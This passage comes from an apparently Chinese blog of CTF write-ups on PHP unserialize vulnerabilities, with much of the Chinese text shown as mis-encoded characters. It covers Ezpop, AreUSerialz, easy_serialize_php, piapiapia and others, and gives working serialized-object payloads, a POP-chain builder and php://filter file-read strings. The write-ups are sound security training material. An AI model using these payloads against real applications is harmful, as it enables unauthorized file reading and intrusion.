payload</p><p>ï¼Ÿtext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p><p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>é¡µé¢ä¸­æç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå¾¡å‰‘æ‰«ä¸€é</p><p>æ‰¾åˆ°å­˜åœ¨<a href="http://www.zip/">www.zip</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p><p>é‡ç‚¹åœ¨class.phpå’Œindex.phpä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220857753.png" alt="image-20210501220857753"></p><p>æ‰€ä»¥è¦ä¼ å…¥ä¸€ä¸ªselectå‚æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–è®©username=admin</p><p>password=100</p><p>å› ä¸ºusernameå’Œpasswordä¸¤ä¸ªä¸ºprivateç±»å‹</p><p>æ‰€ä»¥æœ‰éšè—çš„ç©ºæ ¼ç¬¦</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>é¢˜ç›®æºç </p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>é¢˜ç›®é‡Œå‡ºç°çš„é­”æœ¯å˜é‡</p><pre class="language-none"><code class="language-none">__construct   å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ__toString   å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚__wakeup()   ä½¿ç”¨unserializeæ—¶è§¦å‘__get()    ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®#éš¾ä»¥è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±æ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§__invoke()   å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥é¦–å…ˆè¦getè¿›ä¸€ä¸ªpopå€¼ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨__wakeup()è¿™ä¸ªæ–¹æ³•_</p><p>__<em>wakeup()ä¸­é‡Œåˆ©ç”¨preg_matchå¯¹ä¼ å…¥çš„å€¼è¿›è¡Œè¿‡æ»¤ï¼Œä½†å¦‚æœthis-&gt;sourceæ˜¯showç±»ï¼Œå°±ä¼šè°ƒç”¨</em>__toString</p><p>è¿™é‡Œä¼šè¿”å›$this-&gt;str-&gt;sourceï¼Œä½†å¦‚æœæ²¡æœ‰sourceè¿™ä¸ªå±æ€§ï¼Œæ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨__get()ï¼Œç„¶åä¼šå°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°ï¼Œ</p><p><em>è¿™é‡Œä¹Ÿå°±ä¼šè§¦å‘</em>__invoke()ï¼Œè¿›è€Œè°ƒç”¨append</p><p>åœ¨appendçš„ä¸­å­˜åœ¨includeï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003613462.png" alt="image-20210704003613462"></p><p>payload</p><p>ï¼ˆè‡ªå·±å†™ä¸€ä¸ªè¿˜æ˜¯æœ‰ç‚¹å›°éš¾</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Show(&#39;aaa&#39;);$a-&gt;str &#x3D; new Test();$a-&gt;str-&gt;p &#x3D; new Modifier();$b &#x3D; new Show($a);echo urlencode(serialize($b));</code></pre><p>base64è§£ç æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p><h2 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p><p>ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºè¿™é‡Œé¦–å…ˆè¦å…ˆgetè¿›pleaseget=1ç„¶åpostè¿›pleasepostï¼Œmd51ï¼Œmd52å’Œobjå››ä¸ªå€¼ï¼Œè€Œobjè¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–çš„æ¼æ´</p><p>ä¸”å½“if($this-&gt;correct === $this-&gt;input)æˆç«‹æ—¶å°±ä¼šæ‰“å°å‡ºflag</p><p>è¿™é‡ŒåŒæ—¶è¦æ±‚ä¼ å…¥çš„md51å’Œmd52çš„md5å€¼ç›¸ç­‰ï¼Œä¸”è‡ªèº«ä¸ç›¸ç­‰ï¼Œç”±äºmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥ä¼ å…¥æ•°ç»„çš„è¿”å›å€¼éƒ½ä¸ºnull</p><p>è€Œå› ä¸º$this-&gt;correctè¿™é‡Œè¿›è¡Œäº†ç¼–ç ï¼Œæ‰€ä»¥è¦ä½¿ifè¯­å¥æˆç«‹åœ¨æ„é€ payloadæ—¶å¯ä»¥é‡‡ç”¨å¼•ç”¨èµ‹å€¼çš„æ–¹æ³•</p><p>æ„é€ payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141338826.png" alt="image-20210705141338826"></p><p>//uniqid() :å‡½æ•°åŸºäºä»¥å¾®ç§’è®¡çš„å½“å‰æ—¶é—´ï¼Œç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ IDã€‚</p><p>//ä¼ å€¼èµ‹å€¼ï¼šå˜é‡é»˜è®¤æ€»æ˜¯ä¼ å€¼èµ‹å€¼ã€‚é‚£ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å°†ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼èµ‹äºˆä¸€ä¸ªå˜é‡æ—¶ï¼Œæ•´ä¸ªåŸå§‹è¡¨è¾¾å¼çš„å€¼è¢«èµ‹å€¼åˆ°ç›®æ ‡å˜é‡ã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œå½“ä¸€ä¸ªå˜é‡çš„å€¼èµ‹äºˆå¦å¤–ä¸€ä¸ªå˜é‡æ—¶ï¼Œæ”¹å˜å…¶ä¸­ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œå°†ä¸ä¼šå½±å“åˆ°å¦å¤–ä¸€ä¸ªå˜é‡ã€‚</p><p>//å¼•ç”¨èµ‹å€¼ï¼šPHP ä¹Ÿæä¾›äº†å¦å¤–ä¸€ç§æ–¹å¼ç»™å˜é‡èµ‹å€¼ï¼šå¼•ç”¨èµ‹å€¼ã€‚è¿™æ„å‘³ç€æ–°çš„å˜é‡ç®€å•çš„å¼•ç”¨ï¼ˆæ¢è¨€ä¹‹ï¼Œâ€œæˆä¸ºå…¶åˆ«åâ€ æˆ–è€… â€œæŒ‡å‘â€ï¼‰äº†åŸå§‹å˜é‡ã€‚æ”¹åŠ¨æ–°çš„å˜é‡å°†å½±å“åˆ°åŸå§‹å˜é‡ï¼Œåä¹‹äº¦ç„¶ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆpayloadä¸º</p><p>getå†…å®¹ä¸ºï¼š?pleaseget=1</p><p>postå†…å®¹ä¸ºï¼špleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p><p>æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#125;</code></pre><p>çœ‹åˆ°unserializeå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°ååºåˆ—åŒ–ï¼Œæºç é‡Œè¿˜æœ‰file_get_contentsï¼Œæ‰€ä»¥çŒœæµ‹è¿™é¢˜æ˜¯åˆ©ç”¨ååºåˆ—åŒ–é€šè¿‡æ–‡ä»¶åŒ…å«è¯»å–flagï¼Œåˆ©ç”¨php://filteræ¥é€ æˆä»»æ„æ–‡ä»¶è¯»å–</p><p>åœ¨ä¼ å…¥åè¿˜å­˜åœ¨ä¸€ä¸ªis__valid()å‡½æ•°çš„è¿‡æ»¤ï¼Œè¦æ±‚ä¼ å…¥å†…å®¹çš„asciiç åœ¨32åˆ°123ä¹‹å†…</p><p>ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œç”±äºè¦åˆ©ç”¨file_get_contents()è¯»å–flagï¼Œå¹¶å°†å…¶æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦è®©op=2ï¼Œæ‰§è¡Œread()ä¸­çš„å†…å®¹</p><p>æ„é€ payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150325057.png" alt="image-20210705150325057"></p><p>è¿™é‡Œå› ä¸ºprotectè¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå‡ºç°ç‰¹æ®Šç¬¦å·ï¼Œå¯¼è‡´æ— æ³•é€šè¿‡is__validå‡½æ•°çš„è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨å¯¹äºPHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†protectedç±»å‹æ”¹ä¸ºpublicï¼Œä»¥æ¶ˆé™¤ä¸å¯æ‰“å°å­—ç¬¦ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre><p>ï¼ˆåˆšå¼€å§‹ç»™opèµ‹äº†ä¸ªå­—ç¬¦å‹çš„â€œ2â€ï¼Œæ‰¾é”™æ‰¾äº†åŠå¤©ã€‚ã€‚ã€‚</p><p>æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p><p>æ¥ä¸‹æ¥base64è§£ç å°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>ä»£ç å®¡è®¡</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;  return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;  unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;  highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;  $userinfo &#x3D; unserialize($serialize_info);  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));  &#125;</code></pre><p>phpinfoé‡Œæœ‰ä¸œè¥¿ï¼Œå¯ä»¥å…ˆçœ‹çœ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210812234826151.png" alt="image-20210812234826151"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åº”è¯¥å¼€å§‹æƒ³æ€ä¹ˆè®©</p><p>base64_decode($userinfo[&#39;img&#39;])çš„å€¼ç­‰äºflagçš„æ–‡ä»¶å</p><p><strong>çŸ¥è¯†ç‚¹</strong></p><ul><li>ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</li><li>extract()å˜é‡è¦†ç›–</li></ul><p><strong>extract()å˜é‡è¦†ç›–</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813004733910.png" alt="image-20210813004733910"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç»™imgèµ‹å€¼ï¼Œå› ä¸ºimgèµ‹å€¼å‘ç”Ÿåœ¨extractä¹‹å</p><p><strong>ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</strong></p><p><strong>é”®å€¼é€ƒé€¸</strong></p><ul><li>å› ä¸ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ˜¯ä¸¥æ ¼çš„ï¼Œå¯¹åº”çš„æ ¼å¼ä¸èƒ½é”™ï¼Œæ¯”å¦‚s:4:â€œnameâ€,é‚£s:4å°±å¿…é¡»æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦æ˜¯4çš„å¦åˆ™å°±å¾€åè¦ã€‚</li><li>å¹¶ä¸”ååºåˆ—åŒ–ä¼šæŠŠå¤šä½™çš„å­—ç¬¦ä¸²å½“åƒåœ¾å¤„ç†ï¼Œåœ¨èŠ±æ‹¬å·å†…çš„å°±æ˜¯æ­£ç¡®çš„ï¼ŒèŠ±æ‹¬å·<code>&#123;&#125;</code>å¤–çš„å°±éƒ½è¢«æ‰”æ‰ã€‚</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813005203142.png" alt="image-20210813005203142"></p><p>æ¥ä¸‹æ¥æ˜¯æ„é€ payloadçš„éƒ¨åˆ†</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ imgå±æ€§ï¼š</p><p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p><p>å…¶ä¸­çš„ZDBnM19mMWFnLnBocA==æ˜¯d0g3_f1ag.phpçš„base64åŠ å¯†çš„ç»“æœç„¶ååœ¨è¿™ä¸ªå±æ€§å‰é¢éšä¾¿åŠ ä¸Šä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆåªè¦æ˜¯åˆæ³•çš„å°±è¡Œï¼‰ï¼Œæ¯”å¦‚ï¼š</p><p>;s:1:â€œ1â€;<br>;s:2:â€œ10â€;<br>;s:3:â€œ100â€;</p><p>æ‰€ä»¥payloadå¯ä»¥ä¸ºï¼š</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>sessionä¸­å­˜åœ¨phpflagçš„åŸå› æ˜¯ç”±äºfilterå‡½æ•°ä¼šå°†åŒ¹é…åˆ°çš„å€¼å˜ä¸ºç©ºï¼Œè€Œphpflagçš„é•¿åº¦åˆšå¥½ä¸º7</p><p><strong>ä¸º7çš„åŸå› </strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010634981.png" alt="image-20210813010634981"></p><p>ä½†æ˜¯æ·»åŠ äº†filterå‡½æ•°æ¥è¿›è¡Œè¿‡æ»¤ä¹‹å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010753030.png" alt="image-20210813010753030"></p><p>åŸæ¥çš„å†…å®¹å˜ä¸ºäº†</p><pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>èƒ½æˆåŠŸå®ç°è¯»å–flagæ‰€åœ¨æ–‡ä»¶çš„å‘½ä»¤</p><p>postå</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011013959.png" alt="image-20210813011013959"></p><p>å¯¹/d0g3_fllllllagè¿›è¡Œbase64ç¼–ç åä¸ºL2QwZzNfZmxsbGxsbGFn</p><p>æ‰€ä»¥ç›´æ¥æŠŠåŸæ¥çš„ç¼–ç æ›¿æ¢æ‰å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011156367.png" alt="image-20210813011156367"></p><p>çœ‹æ˜¯çœ‹æ‡‚äº†ï¼Œä½†æˆ‘è¿˜æ˜¯æƒ³ä¸åˆ°è¿™ç§payloadã€‚ã€‚ã€‚</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">å®‰æ´µæ¯ 2019]easy_serialize_php -------- ååºåˆ—åŒ–/åºåˆ—åŒ–å’Œä»£ç å®¡è®¡_è‹¥ä¸¶æ—¶å…‰ç ´ç­çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>è¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°æ²¡èƒ½æˆåŠŸï¼Œæ‰«ç›®å½•æ‰«åˆ°<a href="http://www.zipå¤‡ä»½æ–‡ä»¶/">www.zipå¤‡ä»½æ–‡ä»¶</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163607732.png" alt="image-20210903163607732"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903132345413.png" alt="image-20210903132345413"></p><p>è®¿é—®ä¸€ä¸‹register.phpæ³¨å†Œä¸ªè´¦æˆ·å°±å¯ä»¥ç™»å½•äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163626344.png" alt="image-20210903163626344"></p><p>å†çœ‹å…¶ä»–çš„å†…å®¹</p><p>profile.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   $username &#x3D; $_SESSION[&#39;username&#39;];   $profile&#x3D;$user-&gt;show_profile($username);   if($profile  &#x3D;&#x3D; null) &#123;      header(&#39;Location: update.php&#39;);   &#125;   else &#123;      $profile &#x3D; unserialize($profile);      $phone &#x3D; $profile[&#39;phone&#39;];      $email &#x3D; $profile[&#39;email&#39;];      $nickname &#x3D; $profile[&#39;nickname&#39;];      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;   private $table &#x3D; &#39;users&#39;;   public function is_exists($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::select($this-&gt;table, $where);   &#125;   public function register($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);      $value_list &#x3D; Array($username, md5($password));      return parent::insert($this-&gt;table, $key_list, $value_list);   &#125;   public function login($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;         return true;      &#125; else &#123;         return false;      &#125;   &#125;   public function show_profile($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      return $object-&gt;profile;   &#125;   public function update_profile($username, $new_profile) &#123;      $username &#x3D; parent::filter($username);      $new_profile &#x3D; parent::filter($new_profile);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;class mysql &#123;   private $link &#x3D; null;   public function connect($config) &#123;      $this-&gt;link &#x3D; mysql_connect(         $config[&#39;hostname&#39;],         $config[&#39;username&#39;],          $config[&#39;password&#39;]      );      mysql_select_db($config[&#39;database&#39;]);      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);      return $this-&gt;link;   &#125;   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;      $result &#x3D; mysql_query($sql, $this-&gt;link);      return mysql_fetch_object($result);   &#125;   public function insert($table, $key_list, $value_list) &#123;      $key &#x3D; implode(&#39;,&#39;, $key_list);      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;       $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;      return mysql_query($sql);   &#125;   public function update($table, $key, $value, $where) &#123;      $sql 